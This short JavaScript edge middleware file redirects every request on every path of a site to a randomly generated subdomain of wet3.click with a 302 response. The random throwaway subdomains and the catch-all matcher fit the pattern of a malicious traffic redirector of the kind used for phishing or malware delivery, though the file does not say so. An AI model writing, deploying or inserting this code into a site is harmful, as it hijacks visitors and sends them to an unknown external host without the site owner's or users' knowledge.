export default function middleware(request) {
  // 1. Generate a random 6-character string
  const randomStr = Math.random().toString(36).substring(2, 8);
  
  // 2. Construct the destination URL
  const destination = `https://${randomStr}.wet3.click`;

  // 3. Return a standard Web Redirect Response
  return Response.redirect(destination, 302);
}

// Ensure it runs on all paths
export const config = {
  matcher: '/:path*',
};
